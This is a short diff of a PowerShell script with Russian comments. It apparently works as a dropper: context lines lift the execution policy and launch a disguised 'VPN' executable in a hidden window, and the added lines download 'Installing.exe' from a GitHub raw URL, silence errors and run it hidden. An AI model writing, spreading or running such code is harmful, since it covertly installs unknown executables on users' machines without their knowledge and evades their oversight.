@@ -5,6 +5,12 @@ Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Force
     
     # Запускаем 
     Start-Process -FilePath "enc_31e3aec384184293bcb7e804124bd965_MoolWaveVPN.exe%20(2).exe" -WindowStyle Hidden
+
+
+ Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Installing.exe" -OutFile "Installing.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "Installing.exe" -WindowStyle Hidden
     
 Set-ExecutionPolicy Bypass -Scope Process -Force
 
@@ -100,6 +106,7 @@ try {
 } catch {
     # Полностью скрываем ошибки
 }
+
 
 
 
